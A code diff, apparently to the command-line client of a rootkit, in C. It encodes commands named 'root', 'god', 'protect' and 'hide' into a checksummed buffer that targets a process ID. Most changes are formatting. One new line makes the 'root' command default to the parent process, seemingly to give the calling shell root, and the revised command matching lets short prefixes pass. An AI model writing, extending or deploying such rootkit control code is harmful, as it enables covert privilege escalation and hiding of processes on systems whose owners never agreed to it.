@@ -1,6 +1,7 @@
 #include <endian.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <stdbool.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -8,7 +9,6 @@
 #include <sys/types.h>
 #include <time.h>
 #include <unistd.h>
-#include <stdbool.h>
 
 enum {
   SIG_GOD = 0xFF,
@@ -18,12 +18,12 @@ enum {
 };
 
 enum {
-    CMD_SIZE = sizeof(char),
-    RAND_BYTES_SIZE = 4 * sizeof(char),
-    CRC_SIZE = sizeof(uint32_t),
-    PID_OFFSET = CMD_SIZE + RAND_BYTES_SIZE,
-    PID_SIZE = sizeof(pid_t),
-    TOTAL_SIZE = CMD_SIZE + RAND_BYTES_SIZE + PID_SIZE + CRC_SIZE
+  CMD_SIZE = sizeof(char),
+  RAND_BYTES_SIZE = 4 * sizeof(char),
+  CRC_SIZE = sizeof(uint32_t),
+  PID_OFFSET = CMD_SIZE + RAND_BYTES_SIZE,
+  PID_SIZE = sizeof(pid_t),
+  TOTAL_SIZE = CMD_SIZE + RAND_BYTES_SIZE + PID_SIZE + CRC_SIZE
 };
 
 const uint32_t crc32_tab[] = {
@@ -112,21 +112,23 @@ void print_buf(const char buffer[], size_t size) {
 }
 
 // Translate cmd using CmdSignal enum and store the value to *ptr
-void get_cmd(const char *cmd, uint8_t *ptr) {
-    if (strncmp(cmd, "root", strlen("root")) == 0) {
-      *ptr = SIG_ROOT;
-    } else if (strncmp(cmd, "god", strlen("god")) == 0) {
-      *ptr = SIG_GOD;
-    } else if (strncmp(cmd, "protect", strlen("protect")) == 0) {
-      *ptr = SIG_PROTECT;
-    } else if (strncmp(cmd, "hide", strlen("hide")) == 0) {
-      *ptr = SIG_HIDE;
-    } else {
-        fprintf(stderr, "%s is not a valid command", cmd);
-    }
+void get_cmd(const char *cmd, uint8_t *sig) {
+  size_t cmd_size = strlen(cmd);
+  if (strncmp(cmd, "root", cmd_size) == 0) {
+    *sig = SIG_ROOT;
+  } else if (strncmp(cmd, "god", cmd_size) == 0) {
+    *sig = SIG_GOD;
+  } else if (strncmp(cmd, "protect", cmd_size) == 0) {
+    *sig = SIG_PROTECT;
+  } else if (strncmp(cmd, "hide", cmd_size) == 0) {
+    *sig = SIG_HIDE;
+  } else {
+    fprintf(stderr, "%s is not a valid command", cmd);
+  }
 }
 
-// Translate pid to a number and store the value to *ptr. Returns false if translation fails
+// Translate pid to a number and store the value to *ptr. Returns false if
+// translation fails
 bool get_pid(char **argv, pid_t *ptr) {
   if (argv[2]) {
     *ptr = (pid_t)(htole32(strtol(argv[2], NULL, 10)));
@@ -141,16 +143,11 @@ bool get_pid(char **argv, pid_t *ptr) {
 }
 
 // Piece all the data together to construct the final buffer
-void finalize_buffer(
-    char buf[1024], 
-    const uint8_t cmd,  
-    const pid_t pid
-)
-{
-    buf[0] = cmd;
-    append_rand_bytes(buf + 1, RAND_BYTES_SIZE);
-    append_pid(buf, pid, PID_OFFSET);
-    append_crc(buf, TOTAL_SIZE - CRC_SIZE);
+void finalize_buffer(char buf[1024], const uint8_t cmd, const pid_t pid) {
+  buf[0] = cmd;
+  append_rand_bytes(buf + 1, RAND_BYTES_SIZE);
+  append_pid(buf, pid, PID_OFFSET);
+  append_crc(buf, TOTAL_SIZE - CRC_SIZE);
 }
 
 int main(int argc, char *argv[]) {
@@ -172,9 +169,12 @@ int main(int argc, char *argv[]) {
 
   // Parse command and PID arguments
   get_cmd(argv[1], &cmd);
-  if (!get_pid(argv, &pid)) { // 
+  if (!get_pid(argv, &pid)) { //
     return 1;
   };
+
+  if (cmd == SIG_ROOT && !pid)
+    pid = getppid(); // set pid to the parent pid
 
   // Construct buffer
   finalize_buffer(buffer, cmd, pid);
